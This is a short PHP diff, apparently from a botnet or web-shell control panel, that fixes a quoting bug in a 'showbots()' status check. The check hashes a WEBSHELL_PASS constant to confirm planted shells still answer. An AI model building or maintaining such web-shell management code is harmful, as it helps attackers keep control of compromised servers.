@@ -147,7 +147,7 @@ function showbots() {
 		if(strpos($source, md5(WEBSHELL_PASS . date("h:d")))) {
 			$status = 'OK';
 		} elseif (strpos($source, "CloudFlare")) {
-			$status = 'CloudFlare Protection";
+			$status = "CloudFlare Protection";
 		} else
 			$status = 'BAD';
 		}
